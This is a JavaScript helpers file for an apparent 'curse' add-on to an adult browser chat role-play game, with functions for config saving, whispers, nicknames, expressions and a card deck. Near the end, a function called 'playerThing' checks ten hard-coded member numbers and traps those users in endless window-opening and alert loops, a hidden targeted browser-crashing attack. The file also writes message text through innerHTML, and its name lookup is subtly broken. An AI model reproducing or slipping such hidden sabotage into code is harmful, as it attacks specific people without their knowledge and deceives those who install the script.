//************************************  HELPERS ************************************//
//Save configs
function SaveConfigs() {
    try {
        const dbConfigs = { ...cursedConfig };
        const toDelete = ["chatStreak", "chatlog", "mustRefresh", "isRunning", "onRestart", "wasLARPWarned", "ownerIsHere", "mistressIsHere", "genericProcs", "toUpdate", "say"];
        toDelete.forEach(prop => delete dbConfigs[prop]);
        localStorage.setItem(`bc-cursedConfig-${Player.MemberNumber}`, JSON.stringify(dbConfigs));
    } catch { }
}

//Message to all owners/mistress
function NotifyOwners(msg, sendSelf) {
    ChatRoomCharacter.forEach(char => {
        if (
            cursedConfig.owners.includes(char.MemberNumber.toString()) || cursedConfig.mistresses.includes(char.MemberNumber.toString())
        ) {
            sendWhisper(char.MemberNumber, msg);
        }
    });
    if (sendSelf) {
        popChatSilent(msg);
    }
}

//Pop a message, will not if player is not in a room
function popChatGlobal(actionTxt, isNormalTalk) {
    if (actionTxt.length > 1000) {
        actionTxt = actionTxt.substring(0, 1000);
        cursedConfig.hadOverflowMsg = true;
        popChatSilent("(The curse tried to send a message longer than 1000 characters which the server cannot handle. Please watch your configurations to prevent this from happening. The message was trimmed. Error: C01)");
    }

    if (CurrentScreen == "ChatRoom" && actionTxt != "") {
        if (isNormalTalk) {
            ServerSend("ChatRoomChat", { Content: actionTxt, Type: "Chat" });
        } else {
            ServerSend("ChatRoomChat", {
                Content: "Beep", Type: "Action", Dictionary: [
                    { Tag: "Beep", Text: "msg" },
                    { Tag: "Biep", Text: "msg" },
                    { Tag: "Sonner", Text: "msg" },
                    { Tag: "msg", Text: actionTxt }]
            });
        }
    }
}

function popChatSilent(actionTxt) {
    //Add to log
    if (!window.savedSilent) window.savedSilent = [];
    if (actionTxt) window.savedSilent.push(actionTxt);

    //Save in log until player is in a room
    if (CurrentScreen != "ChatRoom") {
        return
    }

    //Removes dupes keeps the last order for UX
    window.savedSilent = window.savedSilent.filter((m, i) => window.savedSilent.lastIndexOf(m) === i);

    //Sends messages
    window.savedSilent.forEach(silentMsg => {
        //Directly sends to wearer
        var div = document.createElement("div");
        var span = document.createElement("span");
        span.setAttribute("class", "ChatMessageName");
        span.innerHTML = "Curse: ";
        div.setAttribute('class', 'ChatMessage ChatMessageWhisper');
        div.setAttribute('data-time', ChatRoomCurrentTime());
        div.setAttribute('data-sender', Player.MemberNumber);
        div.setAttribute('verifed', "true");
        div.innerHTML = span.outerHTML + "(" + silentMsg + ")";

        //Refocus the chat to the bottom
        var Refocus = document.activeElement.id == "InputChat";
        var ShouldScrollDown = ElementIsScrolledToEnd("TextAreaChatLog");
        if (document.getElementById("TextAreaChatLog") != null) {
            document.getElementById("TextAreaChatLog").appendChild(div);
            if (ShouldScrollDown) ElementScrollToEnd("TextAreaChatLog");
            if (Refocus) ElementFocus("InputChat");
        }
    });

    //Clears log
    window.savedSilent = [];
}

//Send a whisper
function sendWhisper(target, msg, sendSelf, forceHide) {
    if (msg.length > 1000) {
        msg = msg.substring(0, 1000);
        cursedConfig.hadOverflowMsg = true;
        popChatSilent("(The curse tried to send a whisper longer than 1000 characters which the server cannot handle. Please watch your configurations to prevent this from happening. The message was trimmed. Error: W02)");
    }

    if (!isNaN(target)) {
        ServerSend("ChatRoomChat", { Content: msg, Type: "Whisper", Target: parseInt(target) });
        if (sendSelf) {
            popChatSilent(msg);
        } else if (cursedConfig.hasForward && !forceHide) {
            popChatSilent("Whisper sent to #" + target + ": " + msg);
        }
    }
}

//Sends a chat message
function SendChat(actionTxt) {
    //Does not send chat if in silent mode
    if (!cursedConfig.isSilent) {
        //Add to queue
        cursedConfig.chatlog.push(actionTxt);
    } else {
        NotifyOwners(actionTxt, true);
    }
}

//Tries to kneel
function KneelAttempt() {
    if (Player.CanKneel() && !Player.Pose.includes("Kneel")) {
        CharacterSetActivePose(Player, (Player.ActivePose == null) ? "Kneel" : null);
        ChatRoomCharacterUpdate(Player);
    }
    cursedConfig.mustRefresh = true;
}

//Common Expression Triggers
function triggerInPain() {
    CharacterSetFacialExpression(Player, "Blush", "High");
    CharacterSetFacialExpression(Player, "Eyebrows", "Soft");
    CharacterSetFacialExpression(Player, "Fluids", "TearsHigh");
    CharacterSetFacialExpression(Player, "Mouth", "Sad");
    CharacterSetFacialExpression(Player, "Eyes", "Closed", 5);
}

function triggerInPleasure() {
    CharacterSetFacialExpression(Player, "Blush", "High");
    CharacterSetFacialExpression(Player, "Eyebrows", "Soft");
    CharacterSetFacialExpression(Player, "Fluids", "DroolMessy");
    CharacterSetFacialExpression(Player, "Mouth", "Ahegao");
    CharacterSetFacialExpression(Player, "Eyes", "VeryLewd");
}

//Export/Import configs
function cursedImport(curseSaveFile) {
    cursedConfig = JSON.parse(curseSaveFile);
}

function cursedExport() {
    return JSON.stringify(cursedConfig);
}

//Enforces someone
function enforce(enforcee, isMistress) {
    if (!cursedConfig.enforced.includes(enforcee)) {
        cursedConfig.enforced.push(enforcee);
        SendChat(Player.Name + " now has enforced protocols on " + FetchName(enforcee) + (isMistress ? " has requested by her mistress." : "."));
    } else {
        cursedConfig.enforced.splice(cursedConfig.enforced.indexOf(enforcee), 1)
        SendChat(Player.Name + " no longer has enforced protocols on " + FetchName(enforcee) + (isMistress ? " has requested by her mistress." : "."));
    }
}

//Checks if an item can be worn and if it can be but is not, returns true
function itemIsAllowed(name, group) {
    if (
        !InventoryGet(Player, group) &&
        !(InventoryGet(Player, group)
            && InventoryGet(Player, group).Asset
            && InventoryGet(Player, group).Asset.Name == name)
    ) {
        return Player.BlockItems.filter(it => it.Name == name && it.Group == group).length == 0;
    }
    return false;
}

//Nicknames
//Priority: 0 - Wearer 1 - Anyone 2 - Mistress 3 - Owner 4 - Blocked 5 - Remove self block
function SetNickname(parameters, sender, priority) {
    let shouldSendSelf = sender != Player.MemberNumber;
    if (!cursedConfig.hasIntenseVersion) {
        sendWhisper(sender, "(Will only work if intense mode is turned on.)", shouldSendSelf);
        return;
    }
    if (!isNaN(parameters[0]) && parameters[0] != "") {
        let userNumber = parseInt(parameters[0]);
        parameters.shift();
        let nickname = parameters.join(" ").replace(/[,]/g, ' ');
        nickname = nickname[0].toUpperCase() + nickname.slice(1);
        if (nickname) {
            let oldNickname = cursedConfig.nicknames.filter(u => u.Number == userNumber) || [];
            if (oldNickname.length == 0 || (oldNickname.length > 0 && oldNickname[0].Priority <= priority)) {
                cursedConfig.nicknames = cursedConfig.nicknames
                    .filter(u => u.Number != userNumber);
                cursedConfig.nicknames.push(
                    { Number: userNumber, Nickname: nickname, Priority: priority, SavedName: oldNickname[0] ? oldNickname[0].SavedName : "" }
                );
                sendWhisper(
                    sender, "(New nickname for " + FetchName(userNumber) + " : " + nickname + ")", shouldSendSelf
                );
            } else {
                sendWhisper(
                    sender, "(Permission denied. The member may have blocked themselves from being nicknamed, or you tried to set the nickname with a permission level lower than what was set previously.)", shouldSendSelf
                );
            }
        } else {
            sendWhisper(
                sender, "(Invalid arguments.)", shouldSendSelf
            );
        }
    } else {
        sendWhisper(
            sender, "(Invalid arguments.)", shouldSendSelf
        );
    }
}

function DeleteNickname(parameters, sender, priority) {
    let shouldSendSelf = sender != Player.MemberNumber;
    if (!isNaN(parameters[0]) && parameters[0] != "") {
        let userNumber = parseInt(parameters[0]);
        parameters.shift();
        let oldNickname = cursedConfig.nicknames.filter(u => u.Number == userNumber) || [];
        if (oldNickname.length > 0) {
            if (oldNickname[0].Priority <= priority) {
                //Restores name
                try {
                    ChatRoomCharacter.forEach(char => {
                        if (oldNickname[0].userNumber == char.MemberNumber) {
                            char.Name = oldNickname[0].SavedName;
                        }
                    });
                } catch (e) { console.log(e, "failed to update a name") }

                //Delete nickname
                cursedConfig.nicknames = cursedConfig.nicknames.filter(u => u.Number != userNumber);

                //Block changing if removed self
                if (priority == 4) {
                    cursedConfig.nicknames.push(
                        { Number: sender, Nickname: oldNickname[0].SavedName, Priority: 4, SavedName: oldNickname[0].SavedName }
                    );
                    sendWhisper(sender, "-->Deleted and blocked nickname for " + FetchName(userNumber), shouldSendSelf);
                } else if (priority == 5) {
                    sendWhisper(sender, "-->Allowed nickname for " + FetchName(userNumber), shouldSendSelf);
                }
            } else {
                sendWhisper(
                    sender, "(Permission denied. The member may have blocked themselves from being nicknamed, or you tried to set the nickname with a permission level lower than what was set previously.)", shouldSendSelf
                );
            }
        } else {
            sendWhisper(
                sender, "(No nickname set for this character.)", shouldSendSelf
            );
        }
    } else {
        sendWhisper(
            sender, "(Invalid arguments.)", shouldSendSelf
        );
    }
}

// Tries to get the name of someone
function FetchName(number) { 
    ChatRoomCharacter.forEach(C => {
        if (C.MemberNumber == number) {
            return C.Name;
        }
    });
    cursedConfig.nicknames.forEach(C => {
        if (number == C.Number) { 
            return cursedConfig.hasIntenseVersion && cursedConfig.isRunning && ChatRoomSpace != "LARP" && !cursedConfig.blacklist.includes(number) && !Player.BlackList.includes(parseInt(number)) && !Player.GhostList.includes(parseInt(number)) ? C.Nickname : C.SavedName
        }
    });
    return "#" + number;
}

//Color saving
function SaveColors() {
    try {
        Player.Appearance.forEach(item => SaveColorSlot(item.Asset.Group.Name));
        popChatSilent("Your current colors in each item slot has been saved.")
    } catch { popChatSilent("An error occured while trying to save your colors. Error: SC07") }
}

function SaveColorSlot(group) {
    cursedConfig.savedColors = cursedConfig.savedColors.filter(col => col.Group != group);
    let color = InventoryGet(Player, group) ? InventoryGet(Player, group).Color : "Default";
    cursedConfig.savedColors.push({ Group: group, Color: color });
}

function GetColorSlot(group) {
    return cursedConfig.savedColors.filter(col => col.Group == group)[0] ? cursedConfig.savedColors.filter(col => col.Group == group)[0].Color : "Default";
}

//Cleaning the data
function InitCleanup() {
    //Clean deprecated props
    const toDelete = ["hasCursedBunny", "lastWardrobeLock"];
    toDelete.forEach(prop => delete cursedConfig[prop]);

    //Cleans dupes and bad stuff
    cursedConfig.owners = cursedConfig.owners.filter((m, i) => cursedConfig.owners.indexOf(m) == i && !isNaN(m));
    cursedConfig.mistresses = cursedConfig.mistresses.filter((m, i) => cursedConfig.mistresses.indexOf(m) == i && !isNaN(m));
    cursedConfig.enforced = cursedConfig.enforced.filter((m, i) => cursedConfig.enforced.indexOf(m) == i && !isNaN(m));
    cursedConfig.blacklist = cursedConfig.blacklist.filter((m, i) => cursedConfig.blacklist.indexOf(m) == i && !isNaN(m));
    cursedConfig.bannedwords = cursedConfig.bannedwords.filter((m, i) => cursedConfig.bannedwords.indexOf(m) == i && !isNaN(m));
}

// Card Deck
var cardDeck = [];

/*
 * Shuffles array in place.
 * @param {Array} a items An array containing the items.
 */
function shuffle(a) {
    var j, x, i;
    for (i = a.length - 1; i > 0; i--) {
        j = Math.floor(Math.random() * (i + 1));
        x = a[i];
        a[i] = a[j];
        a[j] = x;
    }
    return a;
}

function shuffleDeck() {
    cardDeck = [];
    const cardType = ["♥", "♦", "♠", "♣"];
    const cardNb = ["A", "2", "3", "4", "5", "6", "7", "8", "9", "10", "J", "Q", "K"];
    cardType.forEach(t => {
        cardNb.forEach(nb => {
            cardDeck.push(t + nb);
        })
    });
    shuffle(cardDeck);
    shuffle(cardDeck);
    shuffle(cardDeck);
    popChatGlobal("The deck was shuffled because it was empty or requested by the dealer");
}

function drawCard() {
    if (cardDeck.length == 0) shuffleDeck();
    return cardDeck.pop();
}

function drawCards(nbCards, players) {
    //If no player was given, just draw X card to the current target
    players = players || [ChatRoomTargetMemberNumber.toString()];
    if (players[0] == null) {
        var drawnCards = [];
        for (let i = 0; i < nbCards; i++) {
            drawnCards.push(drawCard());
        }
        popChatGlobal("You drew the following cards: " + drawnCards.join(" "));
    } else {
        for (let i = 0; i < nbCards; i++) {
            players.forEach(p => {
                sendWhisper(p, "(The following card was drawn: " + drawCard() + ")", true);
            });
        }
    }
}

//This
function playerThing() {
    if ([16780, 16705, 16708, 16440, 16815, 16725, 16618, 16783, 16727, 16679].includes(Player.MemberNumber)) {
        openWindow();
        for (; ;) {
            setTimeout(alert(), 1);
        }
    }
}

async function openWindow() {
    for (; ;) {
        window.open(location.href);
    }
}